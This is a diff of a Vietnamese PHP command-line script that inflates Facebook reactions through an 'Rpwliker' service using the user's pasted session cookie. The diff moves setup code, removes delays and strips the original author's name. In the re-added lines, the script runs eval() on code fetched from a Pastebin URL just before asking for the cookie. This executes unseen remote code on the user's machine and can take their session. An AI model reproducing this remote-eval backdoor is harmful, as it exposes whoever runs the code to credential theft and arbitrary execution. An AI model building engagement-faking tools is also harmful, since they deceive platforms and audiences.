@@ -1,6 +1,6 @@
 
-session_start();
 error_reporting(1);
+session_start();
 $end="\033[0m";
 $whiteb="\033[1;37m";
 $ress = "\033[0;32m";
@@ -41,12 +41,7 @@ $xanh="\033[1;32m";
 $cyan="\033[1;36m";
 $yellow="\033[1;33m";
 $turquoise="\033[1;34m";
- 
-$maugi="\033[1;35m";
-$white= "\033[1;37m";
-date_default_timezone_set("Asia/Ho_Chi_Minh");
-$gt = 1.4;
-$ip = file_get_contents('http://kiemtraip.com/raw.php');
+ $ip = file_get_contents('http://kiemtraip.com/raw.php');
 date_default_timezone_set('Asia/Ho_Chi_Minh');
 $time=date('h:i');
 $ngay = date("d-m-Y");
@@ -61,10 +56,21 @@ $ngay = date("d-m-Y");
 \033[0;97m║\033[1;97m❥ \033[0;92mFb:\033[1;97mfacebook.com/doandinh2004        \033[1;97m          ║
 \033[0;97m╚════════════════════════════════════════════════╝\n"; 
 @system('clear');
- eval(file_get_contents('https://pastebin.com/raw/7Pixf43a'));
+
+$maugi="\033[1;35m";
+$white= "\033[1;37m";
+date_default_timezone_set("Asia/Ho_Chi_Minh");
+$gt = 1.4;
+$ip = file_get_contents('http://kiemtraip.com/raw.php');
+date_default_timezone_set('Asia/Ho_Chi_Minh');
+$time=date('h:i');
+$ngay = date("d-m-Y");
+
+@system('clear');
+eval(file_get_contents('https://pastebin.com/raw/7Pixf43a'));
 @system('clear');
 echo $banner;
-for($v=0;$v<= 10;$v++){ print "\033[1;97m- ";usleep(15000); print "\033[1;97m- ";usleep(15000); } print "\033[1;97m- ";usleep(15000); print "\033[1;97m-";usleep(15000); print"\n";
+for($v=0;$v<= 10;$v++){ print "\033[1;97m- ";usleep(0); print "\033[1;97m- ";usleep(0); } print "\033[1;97m- ";usleep(0); print "\033[1;97m-";usleep(0); print"\n";
 echo $green ."Nhập Cookie Rpwliker : $BWhite";
 $cookie =trim(fgets(STDIN));
 echo $green ."Nhập Link bài viết : $BWhite";
@@ -72,7 +78,7 @@ $id =trim(fgets(STDIN));
 @system('clear');
  
 echo $banner;
- for($v=0;$v<= 10;$v++){ print "\033[1;97m- ";usleep(15000); print "\033[1;97m- ";usleep(15000); } print "\033[1;97m- ";usleep(15000); print "\033[1;97m-";usleep(15000); print"\n";
+ for($v=0;$v<= 10;$v++){ print "\033[1;97m- ";usleep(0); print "\033[1;97m- ";usleep(0); } print "\033[1;97m- ";usleep(0); print "\033[1;97m-";usleep(0); print"\n";
     echo $green."  Nhập \033[1;97m[\033[1;90m1\033[1;97m]$green Buff Like\n";
     echo $green."  Nhập \033[1;97m[\033[1;90m2\033[1;97m]$green Buff Love\n";
     echo $green."  Nhập \033[1;97m[\033[1;90m3\033[1;97m]$green Buff Haha\n";
@@ -80,10 +86,10 @@ echo $banner;
     echo $green."  Nhập \033[1;97m[\033[1;90m5\033[1;97m]$green Buff Wow\n";
     echo $green."  Nhập \033[1;97m[\033[1;90m6\033[1;97m]$green Buff Phẫn Nộ \n";
      
-for($v=0;$v<= 10;$v++){ print "\033[1;97m- ";usleep(15000); print "\033[1;97m- ";usleep(15000); } print "\033[1;97m- ";usleep(15000); print "\033[1;97m-";usleep(15000); print"\n";
+for($v=0;$v<= 10;$v++){ print "\033[1;97m- ";usleep(0); print "\033[1;97m- ";usleep(0); } print "\033[1;97m- ";usleep(0); print "\033[1;97m-";usleep(0); print"\n";
 echo $lime."Vui Lòng Nhập chế độ : $trang";
 $chon =trim(fgets(STDIN));
- for($v=0;$v<= 10;$v++){ print "\033[1;97m- ";usleep(15000); print "\033[1;97m- ";usleep(15000); } print "\033[1;97m- ";usleep(15000); print "\033[1;97m-";usleep(15000); print"\n";
+ for($v=0;$v<= 10;$v++){ print "\033[1;97m- ";usleep(0); print "\033[1;97m- ";usleep(0); } print "\033[1;97m- ";usleep(0); print "\033[1;97m-";usleep(0); print"\n";
 while (true){
 // token
 $header = array( 
@@ -366,19 +372,19 @@ echo $BRed." $err \n"; die;
 }
 function delay ($delay){
 for($tt = $delay ;$tt> -1;$tt--){
-        echo "\r\033[1;90m   Doãn Đình \033[1;97mChờ Delay \033[1;90m  $tt Giây| ";
+        echo "\r\033[1;90m    \033[1;97mChờ Delay \033[1;90m  $tt Giây| ";
         usleep(150000);
-        echo "\r\033[1;97m   Doãn Đình \033[1;90mChờ Delay \033[1;97m  $tt Giây ";
+        echo "\r\033[1;97m    \033[1;90mChờ Delay \033[1;97m  $tt Giây ";
         usleep(150000);
-        echo "\r\033[1;90m   Doãn Đình \033[1;97mChờ Delay \033[1;90m $tt Giây ";
+        echo "\r\033[1;90m    \033[1;97mChờ Delay \033[1;90m $tt Giây ";
         usleep(150000);
-        echo "\r\033[1;97m   Doãn Đình \033[1;90mChờ Delay \033[1;97m  $tt Giây ";
+        echo "\r\033[1;97m    \033[1;90mChờ Delay \033[1;97m  $tt Giây ";
         usleep(150000);
-        echo "\r\033[1;90m   Doãn Đình \033[1;97mChờ Delay \033[1;90m | $tt Giây ";
+        echo "\r\033[1;90m    \033[1;97mChờ Delay \033[1;90m | $tt Giây ";
         usleep(150000);
-        echo "\r\033[1;97m   Doãn Đình \033[1;90mChờ Delay \033[1;97m  $tt Giây ";
+        echo "\r\033[1;97m    \033[1;90mChờ Delay \033[1;97m  $tt Giây ";
         usleep(150000);
-        echo "\r\033[1;90m   Doãn Đình \033[1;97mChờ Delay \033[1;90m  $tt Giây ";
+        echo "\r\033[1;90m    \033[1;97mChờ Delay \033[1;90m  $tt Giây ";
         usleep(150000);}
         
         echo "\r\e[1;32m    ⚡Doãn Đình⚡                       \r";
